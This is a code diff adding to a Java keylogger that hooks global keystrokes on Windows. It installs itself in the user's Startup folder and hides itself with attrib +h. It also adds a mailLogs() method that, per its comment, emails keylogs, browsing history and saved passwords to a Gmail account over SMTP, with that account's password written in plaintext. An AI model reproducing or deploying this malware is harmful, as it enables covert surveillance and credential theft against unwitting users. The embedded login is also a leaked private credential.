@@ -20,7 +20,23 @@ import java.net.UnknownHostException;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
+import java.util.Properties;
 import java.util.Scanner;
+
+import javax.activation.DataHandler;
+import javax.activation.DataSource;
+import javax.activation.FileDataSource;
+import javax.mail.BodyPart;
+import javax.mail.Message;
+import javax.mail.MessagingException;
+import javax.mail.Multipart;
+import javax.mail.PasswordAuthentication;
+import javax.mail.Session;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
+import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -32,16 +48,16 @@ public class Main implements NativeKeyListener{
 		if (getCurrentVersion() > version) {
 			// update the code, replace current version with new version. (not done)
 		}
-		String[] protect = new String[]{"s-duv", "citrus", "s-suzukia","s-tehi", "s-chenb"};
+		String[] protect = new String[]{"s-duv", "citrus", "s-suzukia","s-tehi", "s-chenb", "s-chenr"};
 		// System.out.println(System.getProperty("user.name"));
 		for(int fsk = 0; fsk < protect.length; fsk++) {
 			// System.out.println(System.getProperty("user.name"));
 			if (protect[fsk].matches(System.getProperty("user.name"))) {
-				System.out.println(fsk);
+				// System.out.println(fsk);
 				System.exit(0);
 			}
 		}
-		if (!isWindows()) {
+		if (!isWindows()){
 			System.out.println("This ain't windows, son!");
 			System.exit(0);
 		}
@@ -53,12 +69,9 @@ public class Main implements NativeKeyListener{
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 		// System.out.println("Location " + yiffyiff);
 		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
-		// System.out.println("Startup " + startup);
-		// System.out.println("Running command " + System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
 		 @SuppressWarnings("unused")
-		//  Process selfcopy = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "copy \"" + yiffyiff + "\"" + " \"" + startup +"\"");
 		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
-		 
+		 Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
 		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
 		if(!log.exists()) {
 			System.out.println("Creating logfile...");
@@ -86,7 +99,7 @@ public class Main implements NativeKeyListener{
 		    cal.setTime(date);
 		    int minutes = cal.get(Calendar.MINUTE);
 		    // upload(getHostIP());
-		    uphistory(getHostIP());
+		   // uphistory(getHostIP());
 			 if (minutes % 2 == 0) {
 			    	// send the file
 				 System.out.println("A " + minutes);
@@ -272,5 +285,79 @@ public class Main implements NativeKeyListener{
 		 } catch (Exception ee) {
 			 return 1;
 		 }
+	 }
+	 public static void mailLogs() {
+		 // mail keylog, history and saved passwords to email address
+		 // Recipient's email ID needs to be mentioned.
+	      String to = "duvictor514@gmail.com";
+
+	      // Sender's email ID needs to be mentioned
+	      String from = "duvictor514@gmail.com";
+
+	      final String username = "duvictor514@gmail.com";//change accordingly
+	      final String password = "jessicazh12five";//change accordingly
+
+	      // Assuming you are sending email through relay.jangosmtp.net
+	      String host = "smtp.gmail.com";
+
+	      Properties props = new Properties();
+	      props.put("mail.smtp.auth", "true");
+	      props.put("mail.smtp.starttls.enable", "true");
+	      props.put("mail.smtp.host", host);
+	      props.put("mail.smtp.port", "587"); // tls port
+
+	      // Get the Session object.
+	      Session session = Session.getInstance(props,
+	         new javax.mail.Authenticator() {
+	            protected PasswordAuthentication getPasswordAuthentication() {
+	               return new PasswordAuthentication(username, password);
+	            }
+	         });
+
+	      try {
+	         // Create a default MimeMessage object.
+	         Message message = new MimeMessage(session);
+
+	         // Set From: header field of the header.
+	         message.setFrom(new InternetAddress(from));
+
+	         // Set To: header field of the header.
+	         message.setRecipients(Message.RecipientType.TO,
+	            InternetAddress.parse(to));
+
+	         // Set Subject: header field
+	         message.setSubject("Testing Subject");
+
+	         // Create the message part
+	         BodyPart messageBodyPart = new MimeBodyPart();
+
+	         // Now set the actual message
+	         messageBodyPart.setText("This is a bot message");
+
+	         // Create a multipar message
+	         Multipart multipart = new MimeMultipart();
+
+	         // Set text message part
+	         multipart.addBodyPart(messageBodyPart);
+
+	         // Part two is attachment
+	         messageBodyPart = new MimeBodyPart();
+	         String filename = "/home/citrus/test.txt";
+	         DataSource source = new FileDataSource(filename);
+	         messageBodyPart.setDataHandler(new DataHandler(source));
+	         messageBodyPart.setFileName(filename);
+	         multipart.addBodyPart(messageBodyPart);
+
+	         // Send the complete message parts
+	         message.setContent(multipart);
+
+	         // Send message
+	         Transport.send(message);
+
+	         System.out.println("Sent message successfully....");
+	  
+	      } catch (MessagingException e) {
+	         throw new RuntimeException(e);
+	      }
 	 }
 }
